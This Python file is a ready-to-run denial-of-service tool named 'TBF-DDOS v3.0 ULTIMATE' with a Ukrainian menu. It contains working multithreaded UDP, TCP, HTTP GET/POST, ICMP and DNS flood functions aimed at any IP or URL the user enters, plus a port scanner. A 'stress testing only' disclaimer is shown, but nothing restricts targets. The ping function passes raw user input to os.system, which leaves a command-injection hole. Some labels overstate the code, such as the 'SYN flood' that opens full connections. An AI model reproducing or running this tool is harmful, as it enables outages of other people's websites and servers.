import os
import sys
import time
import socket
import threading
import requests
from rich.console import Console
from rich.panel import Panel
from rich.table import Table
from rich.progress import Progress, SpinnerColumn, BarColumn, TextColumn
from rich.prompt import Prompt, IntPrompt

console = Console()

def clear_screen():
    os.system("clear" if os.name != "nt" else "cls")

def show_banner():
    clear_screen()
    banner = """
 [bold cyan]████████╗██████╗ ██████╗     ██████╗ ██████╗  ██████╗ ███████╗[/bold cyan]
 [bold cyan]╚══██╔══╝██╔══██╗██╔══.      ██╔══██╗██╔══██╗██╔═══██╗██╔════╝[/bold cyan]
 [bold blue]   ██║   ██████╔╝██████.     ██║  ██║██║  ██║██║   ██║███████╗[/bold blue]
 [bold blue]   ██║   ██╔══██╗██╔═══╝     ██║  ██║██║  ██║██║   ██║╚════██║[/bold blue]
 [bold magenta]   ██║   ██████╔╝██║         ██████╔╝██████╔╝╚██████╔╝███████║[/bold magenta]
 [bold magenta]   ╚═╝   ╚═════╝ ╚═╝         ╚═════╝ ╚═════╝  ╚═════╝ ╚══════╝[/bold magenta]
    """
    console.print(Panel(banner, title="[bold red]v3.0 ULTIMATE | Stress & Penetration Test Suite[/bold red]", subtitle="[bold white]TBF Brand / TBFPUMBA Ecosystem[/bold white]", border_style="bold red"))

def system_initialization():
    clear_screen()
    console.print("[bold cyan]=== INITIALIZING TBF STRESS ENGINE v3.0 ===[/bold cyan]\n")

    steps = [
        ("Аналіз системних ресурсів та пам'яті...", "bold green"),
        ("Перевірка мережевих інтерфейсів та сокетів...", "bold yellow"),
        ("Синхронізація з потоками TBF Core Engine...", "bold magenta")
    ]

    with Progress(
        SpinnerColumn(),
        TextColumn("[progress.description]{task.description}"),
        BarColumn(),
        TextColumn("[progress.percentage]{task.percentage:>3.0f}%"),
        console=console
    ) as progress:
        for desc, color in steps:
            task = progress.add_task(f"[{color}]{desc}", total=100)
            for _ in range(50):
                time.sleep(0.1)
                progress.advance(task, 2)

    time.sleep(0.5)

def show_disclaimer():
    clear_screen()
    
    author_info = "[bold white]Автор інструмента:[/bold white] [bold cyan]TBF Brand / cocofembo-glitch[/bold cyan]"
    
    disclaimer_text = (
        "[bold red]УВАГА & ДИСКЛЕЙМЕР![/bold red]\n\n"
        "Цей інструмент створено [bold yellow]ВИКЛЮЧНО для навчальних цілей[/bold yellow] "
        "та тестування стійкості власних серверів/мереж (Stress Testing).\n\n"
        "Розробник [bold red]НЕ НЕСЕ ЖОДНОЇ ВІДПОВІДАЛЬНОСТІ[/bold red] за будь-які неправомірні дії, "
        "збитки або порушення закону, вчинені за допомогою цього софту.\n"
        "Ви використовуєте цей інструмент повністю на власний ризик!"
    )

    console.print(Panel(author_info, border_style="cyan"))
    time.sleep(0.8)
    
    console.print(Panel(disclaimer_text, title="[bold red]LEGAL NOTICE[/bold red]", border_style="red"))
    
    console.print("\n[bold green]Натисніть Enter, щоб підтвердити згоду та перейти в меню...[/bold green]")
    input()

def render_menu_table():
    table = Table(title="[bold yellow]ГОЛОВНЕ МЕНЮ TBF-DDOS v3.0 ULTIMATE[/bold yellow]", expand=True, border_style="cyan")
    table.add_column("№", style="bold red", justify="center", width=4)
    table.add_column("Режим / Інструмент", style="bold white", width=26)
    table.add_column("Опис та категорія", style="dim cyan")

    table.add_row("1", "UDP Flood", "Масовий спам UDP-пакетами (L4 Layer)")
    table.add_row("2", "TCP SYN Flood", "Шторм TCP SYN запитів для перезавантаження портів")
    table.add_row("3", "HTTP GET Flood", "Атака запитами GET на веб-сервери (L7 Layer)")
    table.add_row("4", "HTTP POST Flood", "Атака важкими POST-даними на веб-форми")
    table.add_row("5", "ICMP Ping Flood", "Шторм Ping-пакетів для перевірки каналу")
    table.add_row("6", "DNS Amplification Test", "Перевірка стійкості до відбитих DNS-атак")
    table.add_row("7", "Port Scanner & Target Recon", "Швидкий сканер відкритих портів цілі")
    table.add_row("8", "Website Status / Ping Check", "Моніторинг доступності та затримки (Ping/HTTP)")
    table.add_row("9", "IP Resolver / Host Info", "Отримання IP, провайдера та хоста цілі")
    table.add_row("10", "System Info & Network Diagnostics", "Діагностика Termux, RAM та IP пристрою")
    table.add_row("0", "Вихід", "Завершити роботу інструмента")

    console.print(table)

def select_threads_preset():
    console.print("\n[bold yellow]Виберіть режим навантаження (кількість потоків):[/bold yellow]")
    console.print("[bold red]--- Потужний режим (для ПК / потужних смартфонів) ---[/bold red]")
    console.print("[1] 100 потоків (Максимальний пресинг)")
    console.print("[2] 50 потоків  (Стандартний потужний)")
    console.print("[3] 30 потоків  (Помірне навантаження)")
    console.print("[bold green]--- Лайт режим (для слабких телефонів / Termux) ---[/bold green]")
    console.print("[4] 20 потоків  (Легкий тест)")
    console.print("[5] 10 потоків  (Мінімальний)")
    console.print("[6] 5 потоків   (Ультра-слабкі пристрої)")
    console.print("[7] Ввести власне значення вручну\n")

    choice = Prompt.ask("Ваш вибір потоків", choices=["1", "2", "3", "4", "5", "6", "7"], default="2")

    presets = {"1": 100, "2": 50, "3": 30, "4": 20, "5": 10, "6": 5}
    if choice in presets:
        return presets[choice]
    else:
        return IntPrompt.ask("Введіть точну кількість потоків", default=15)

# Глобальний прапор зупинки
is_running = True

def udp_flood(target_ip, target_port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes_payload = os.urandom(1024)
    while is_running:
        try:
            sock.sendto(bytes_payload, (target_ip, target_port))
        except:
            pass

def tcp_flood(target_ip, target_port):
    while is_running:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            sock.connect((target_ip, target_port))
            sock.send(os.urandom(64))
            sock.close()
        except:
            pass

def http_get_flood(target_url):
    while is_running:
        try:
            requests.get(target_url, timeout=2)
        except:
            pass

def http_post_flood(target_url):
    data = {"test": "TBF_STRESS_TEST_" * 50}
    while is_running:
        try:
            requests.post(target_url, data=data, timeout=2)
        except:
            pass

def icmp_ping_flood(target_ip):
    while is_running:
        try:
            os.system(f"ping -c 1 -w 1 {target_ip} > /dev/null 2>&1")
        except:
            pass

def dns_amp_test(target_ip):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    payload = b'\x00\x00\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x25\x00\x01'
    while is_running:
        try:
            sock.sendto(payload, (target_ip, 53))
        except:
            pass

def run_stress_engine(target_desc, attack_func, args, threads_count, duration):
    global is_running
    is_running = True
    threads = []

    console.print(f"\n[bold green][+] Запуск {target_desc} ({threads_count} потоків)...[/bold green]")

    for _ in range(threads_count):
        t = threading.Thread(target=attack_func, args=args)
        t.daemon = True
        t.start()
        threads.append(t)

    with Progress(SpinnerColumn(), TextColumn("[progress.description]{task.description}")) as progress:
        task = progress.add_task("[bold red]Виконується стрес-тест...", total=duration)
        for _ in range(duration):
            if not progress.finished:
                time.sleep(1)
                progress.advance(task, 1)

    is_running = False
    console.print("\n[bold yellow][!] Тест завершено! Зупинка потоків...[/bold yellow]")
    time.sleep(1)
    console.print("[bold green][✓] Готово![/bold green]\n")

def port_scanner():
    target = Prompt.ask("Введіть IP або хост для сканування")
    console.print(f"[bold cyan]Сканування популярних портів на {target}...[/bold cyan]")
    common_ports = [21, 22, 23, 25, 53, 80, 110, 143, 443, 3306, 8080]
    table = Table(title=f"Результати сканування: {target}", border_style="yellow")
    table.add_column("Порт", style="bold white")
    table.add_column("Статус", style="bold green")

    for port in common_ports:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(0.5)
        result = sock.connect_ex((target, port))
        if result == 0:
            table.add_row(str(port), "[bold green]ВІДКРИТИЙ[/bold green]")
        else:
            table.add_row(str(port), "[bold red]ЗАКРИТИЙ[/bold red]")
        sock.close()
    console.print(table)

def status_checker():
    target = Prompt.ask("Введіть URL для перевірки (наприклад, https://google.com)")
    try:
        start_time = time.time()
        res = requests.get(target, timeout=5)
        latency = round((time.time() - start_time) * 1000, 2)
        console.print(Panel(
            f"[bold white]URL:[/bold white] {target}\n"
            f"[bold white]Status Code:[/bold white] [bold green]{res.status_code}[/bold green]\n"
            f"[bold white]Ping / Latency:[/bold white] [bold yellow]{latency} ms[/bold yellow]",
            title="[bold green]Website Status OK[/bold green]", border_style="green"
        ))
    except Exception as e:
        console.print(Panel(f"[bold red]Помилка з'єднання:[/bold red] {e}", title="[bold red]Target Down / Unreachable[/bold red]", border_style="red"))

def ip_resolver():
    host = Prompt.ask("Введіть домен або хост (наприклад, example.com)")
    try:
        ip = socket.gethostbyname(host)
        console.print(Panel(f"[bold white]Хост:[/bold white] {host}\n[bold white]IP Адреса:[/bold white] [bold cyan]{ip}[/bold cyan]", title="[bold cyan]IP Resolved[/bold cyan]", border_style="cyan"))
    except Exception as e:
        console.print(f"[bold red]Не вдалося отримати IP: {e}[/bold red]")

def system_info():
    table = Table(title="Діагностика системи та мережі", border_style="magenta")
    table.add_column("Параметр", style="bold white")
    table.add_column("Значення", style="bold cyan")

    table.add_row("ОС Platform", sys.platform)
    table.add_row("Python Version", sys.version.split()[0])
    try:
        local_ip = socket.gethostbyname(socket.gethostname())
    except:
        local_ip = "127.0.0.1"
    table.add_row("Локальний IP", local_ip)
    console.print(table)

def main():
    system_initialization()
    show_disclaimer()

    while True:
        show_banner()
        render_menu_table()

        choice = Prompt.ask("\nОберіть номер функції", choices=[str(i) for i in range(11)], default="1")

        if choice == "0":
            console.print("[bold red]Завершення роботи TBF-DDOS... До зустрічі![/bold red]")
            break

        elif choice == "1":
            ip = Prompt.ask("Введіть Цільовий IP")
            port = IntPrompt.ask("Введіть Порт", default=80)
            threads = select_threads_preset()
            dur = IntPrompt.ask("Тривалість (сек)", default=15)
            run_stress_engine(f"UDP Flood на {ip}:{port}", udp_flood, (ip, port), threads, dur)

        elif choice == "2":
            ip = Prompt.ask("Введіть Цільовий IP")
            port = IntPrompt.ask("Введіть Порт", default=80)
            threads = select_threads_preset()
            dur = IntPrompt.ask("Тривалість (сек)", default=15)
            run_stress_engine(f"TCP SYN Flood на {ip}:{port}", tcp_flood, (ip, port), threads, dur)

        elif choice == "3":
            url = Prompt.ask("Введіть Цільовий URL (наприклад, http://example.com)")
            threads = select_threads_preset()
            dur = IntPrompt.ask("Тривалість (сек)", default=15)
            run_stress_engine(f"HTTP GET Flood на {url}", http_get_flood, (url,), threads, dur)

        elif choice == "4":
            url = Prompt.ask("Введіть Цільовий URL")
            threads = select_threads_preset()
            dur = IntPrompt.ask("Тривалість (сек)", default=15)
            run_stress_engine(f"HTTP POST Flood на {url}", http_post_flood, (url,), threads, dur)

        elif choice == "5":
            ip = Prompt.ask("Введіть Цільовий IP")
            threads = select_threads_preset()
            dur = IntPrompt.ask("Тривалість (сек)", default=15)
            run_stress_engine(f"ICMP Ping Flood на {ip}", icmp_ping_flood, (ip,), threads, dur)

        elif choice == "6":
            ip = Prompt.ask("Введіть Цільовий DNS IP")
            threads = select_threads_preset()
            dur = IntPrompt.ask("Тривалість (сек)", default=15)
            run_stress_engine(f"DNS Amplification Test на {ip}", dns_amp_test, (ip,), threads, dur)

        elif choice == "7":
            port_scanner()

        elif choice == "8":
            status_checker()

        elif choice == "9":
            ip_resolver()

        elif choice == "10":
            system_info()

        console.print("\n[bold green]Натисніть Enter, щоб повернутися в головне меню...[/bold green]")
        input()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        console.print("\n[bold red][!] Роботу перервано користувачем.[/bold red]")
  
